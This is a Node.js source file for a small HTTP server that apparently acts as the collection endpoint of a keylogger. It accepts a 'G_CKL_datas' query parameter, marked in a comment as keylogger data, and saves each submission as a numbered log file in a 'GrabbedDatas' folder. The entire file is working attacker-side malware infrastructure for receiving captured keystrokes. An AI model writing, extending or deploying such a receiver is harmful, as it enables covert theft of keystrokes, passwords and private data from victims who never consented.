var http 	= require('http');
var util 	= require('util');
var url 	= require('url');
var fs 		= require('fs');

var	current_file_it = 0;

var server = http.createServer(function (request, response) {
	var url_parts = url.parse(request.url, true);
	// console.log('[+] : request.url : [' + request.url + ']');
	for (var param in url_parts.query)
	{
		if (param == "G_CKL_datas")	// Keylogger datas
		{
			// console.log(JSON.stringify(JSON.parse(url_parts.query[param]), null, 4));
			var fileName = "./GrabbedDatas/" + current_file_it++ + ".log";
			fs.writeFile(fileName, JSON.stringify(JSON.parse(url_parts.query[param]), null, 4), function(err) 
			{
				if (err)
					return console.log(err);
				console.log("[+] : datas saved : [" + fileName + ']');
			}); 
		}
		// else
			// console.log(param + ' - ' + url_parts.query[param]);
	}
});

server.listen(1337, '127.0.0.1');
console.log("[+] : HttpServer ready at : 127.0.0.1:1337");